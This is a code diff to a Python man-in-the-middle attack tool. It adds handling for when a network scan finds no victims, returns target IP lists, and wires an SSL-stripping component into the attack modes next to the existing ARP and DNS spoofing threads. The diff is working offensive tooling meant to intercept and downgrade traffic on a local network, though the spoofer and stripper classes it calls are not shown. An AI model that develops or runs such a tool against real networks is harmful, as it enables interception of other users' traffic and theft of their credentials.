@@ -24,10 +24,14 @@ class MITMTool:
         """Setup target IPs based on mode selection."""
         scanner = NetworkScanner(self.gateway, self.interface)
         scanner.start()
-        
+
+        if len(scanner.victim_list) == 0:
+            print("[!] No devices found on the network, try again later!")
+            sys.exit(1)
+
         if self.manual_mode:
             return [scanner.victim_list[int(input(f'Pick a target IP (from 1 to {len(scanner.victim_list) - 1}): '))][0]]
-        return scanner.victim_list
+        return [x[0] for x in scanner.victim_list]
 
     def create_spoofer(self, target: str) -> None:
         """Create and start appropriate spoofer based on attack type."""
@@ -48,7 +52,11 @@ class MITMTool:
             dns_thread.start()
 
         if self.attack_type == 'ssl':
-            pass
+            ssl_stripper = SSLStripper(self.interface, target, self.gateway)
+            self.spoofers.append(ssl_stripper)
+            ssl_thread = threading.Thread(target=ssl_stripper.start, daemon=True)
+            self.threads.append(ssl_thread)
+            ssl_thread.start()
 
     def _start_thread(self, target_func) -> None:
         """Helper method to create and start a thread."""
@@ -62,11 +70,11 @@ class MITMTool:
         for spoofer in self.spoofers:
             print(f"[*] Stopping {type(spoofer).__name__}...")
             spoofer.stop()
+        print("\n[*] Shutting down all threads...")
         for thread in self.threads:
             print(f"[*] Joining thread {thread.name}...")
             thread.join()
             print(f"[*] Thread {thread.name} joined")
-        print("\n[*] Shutting down MITM tool...")
 
     def run(self) -> None:
         """Main execution method."""
